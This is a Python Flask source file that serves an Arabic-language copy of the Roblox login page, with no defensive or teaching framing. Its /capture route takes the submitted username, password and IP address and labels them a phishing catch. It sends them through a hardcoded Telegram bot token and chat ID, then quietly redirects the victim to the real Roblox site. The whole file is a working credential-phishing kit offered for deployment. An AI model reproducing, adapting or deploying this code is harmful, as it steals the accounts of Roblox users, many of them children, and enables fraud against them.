import os
import threading
import urllib.request
import urllib.parse
from flask import Flask, request, render_template_string, abort

app = Flask(__name__)

# ========== إعدادات بوت أخيك ==========
BOT_TOKEN = "9269481096:AAETo6Qk4xC9-eVkZeIFMC_B4mP_Wd1lJ1U" 
CHAT_ID = "6646235976"
# ===================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى Roblox</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { margin: 0; min-height: 100vh; display: flex; flex-direction: column; background-color: #232527; color: white; }
        .header { background: #1a1c1e; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
        .logo { display: flex; justify-content: center; align-items: center; }
        .header .buttons { display: flex; gap: 8px; align-items: center; }
        .btn-login { background: #335cff; color: white; border: none; padding: 7px 16px; border-radius: 4px; font-weight: bold; font-size: 13px; cursor: pointer; }
        .btn-signup { background: transparent; color: #ccc; border: 1px solid #666; padding: 7px 16px; border-radius: 4px; font-weight: bold; font-size: 13px; cursor: pointer; }
        .search-icon { margin-left: 8px; display: flex; align-items: center; }
        .search-icon svg { width: 22px; height: 22px; stroke: #b0b0b0; stroke-width: 2; fill: none; stroke-linecap: round; }
        .nav-links { background: #232527; display: flex; justify-content: space-around; padding: 10px 0; font-size: 13px; font-weight: bold; color: #fff; border-bottom: 1px solid #333; }
        .main-container { flex: 1; padding: 25px 15px; display: flex; justify-content: center; }
        .login-box { width: 100%; max-width: 360px; background: #232527; padding: 30px 22px; border-radius: 8px; }
        .login-box h1 { font-size: 22px; font-weight: 700; text-align: center; margin: 0 0 22px 0; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #444; background: #1e1e22; color: white; border-radius: 6px; font-size: 15px; outline: none; }
        input::placeholder { color: #888; }
        input:focus { border-color: #335cff; }
        .btn-main { width: 100%; padding: 14px; background: transparent; color: #ccc; border: 1px solid #666; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 4px; text-align: center; }
        .forgot { text-align: center; margin-top: 20px; margin-bottom: 20px; font-size: 15px; color: white; text-decoration: none; display: block; font-weight: bold; }
        .divider { display: flex; align-items: center; text-align: center; margin: 18px 0; color: #888; font-size: 13px; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #444; }
        .btn-alt { width: 100%; padding: 14px; background: #2e3136; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; margin-bottom: 12px; display: block; text-align: center; text-decoration: none; }
        .signup { text-align: center; margin-top: 25px; font-size: 13px; color: #ccc; }
        .footer { display: flex; justify-content: space-around; padding: 15px; font-size: 13px; font-weight: bold; color: white; margin-top: auto; background: #1a1c1e; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <svg width="38" height="38" viewBox="0 0 100 100">
                <rect x="20" y="20" width="60" height="60" fill="white" transform="rotate(20 50 50)"/>
                <rect x="42" y="42" width="16" height="16" fill="#1a1c1e" transform="rotate(20 50 50)"/>
            </svg>
        </div>
        <div class="buttons">
            <button class="btn-login">تسجيل الدخول</button>
            <button class="btn-signup">اشتراك</button>
            <div class="search-icon"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
        </div>
    </div>
    <div class="nav-links"><span>الرائجة</span><span>السوق</span><span>إنشاء</span><span>Robux</span></div>
    <div class="main-container">
        <div class="login-box">
            <h1>تسجيل الدخول إلى Roblox</h1>
            <form action="/capture" method="POST">
                <input type="text" name="username" placeholder="اسم المستخدم/البريد/الهاتف" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit" class="btn-main">تسجيل الدخول</button>
            </form>
            <a href="#" class="forgot" onclick="event.preventDefault();">نسيت كلمة المرور أو اسم المستخدم؟</a>
            <div class="divider">تسجيل الدخول باستخدام</div>
            <a href="#" class="btn-alt" onclick="event.preventDefault();">جهاز آخر تم تسجيل الدخول إليه</a>
            <div class="signup">ليس لديك حساب؟ <a href="#" onclick="event.preventDefault();">اشتراك</a></div>
        </div>
    </div>
    <div class="footer"><span>نبذة عنا</span><span>الوظائف</span><span>غرفة الأخبار</span><span>الآباء</span></div>
</body>
</html>
"""

def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": CHAT_ID, "text": message}).encode("utf-8")
    try:
        urllib.request.urlopen(url, data=data, timeout=5)
    except Exception as e:
        print(f"TG Error: {e}")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    msg = (f"🔴 New Login (Phishing):\n\n"
           f"👤 User: {username}\n"
           f"🔑 Pass: {password}\n"
           f"🌐 IP: {ip}")
           
    threading.Thread(target=send_telegram, args=(msg,)).start()

    return """
    <script>
        window.location.href = "https://www.roblox.com/";
    </script>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)